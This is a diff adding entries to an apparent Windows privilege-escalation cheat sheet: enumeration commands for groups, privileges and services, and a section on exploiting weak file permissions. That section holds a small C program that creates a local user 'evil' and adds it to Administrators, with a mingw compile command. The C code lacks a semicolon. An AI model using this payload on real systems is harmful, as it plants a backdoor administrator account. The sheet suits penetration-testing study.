@@ -49,6 +49,7 @@ get-childitem "C:\Program Files\" -Recurse | Get-ACL | ?{$_.AccessToString -matc
 mountvol 
 
 # List drivers
+driverquery /v
 driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
 
 # Gather the version number of the loader driver
@@ -62,8 +63,41 @@ reg query HKEY_Local_USER\Software\Policies\Microsoft\Windows\Installer
 windows-privesc-check2.exe -h 
 windows-privesc-check2.exe --dump -G (Dump security groups info)
 
+# To determine your integrity level
+whoami /groups
+
+# Determine current user privileges from command prompt
+whoami /priv
+
+# Determine users in the administrative group
+net localgroup Administrators
+
 # Run powershell as administrator
 powershell.exe start-process cmd.exe -Verb runAs 
+
+# List running services
+Get-WmiObject win32_service | Select-Object Name, State, PathName | where-object {$_.State -like 'Running'}
+
+# Enumerate service permissions 
+icacls "C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"
+
+# Use wmic to check the start options of a service
+wmic service where caption="ServiceName" get name, caption, state, startmode 
+
+# Exploit weak file permissions
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user evil Ev!lpass /add");
+  i = system ("net localgroup administrators evil /add");
+  return 0
+}
+
+# Compile c code in Wine
+i686-w64-mingw32-gcc adduser.c -o adduser.exe
 ```
 
 
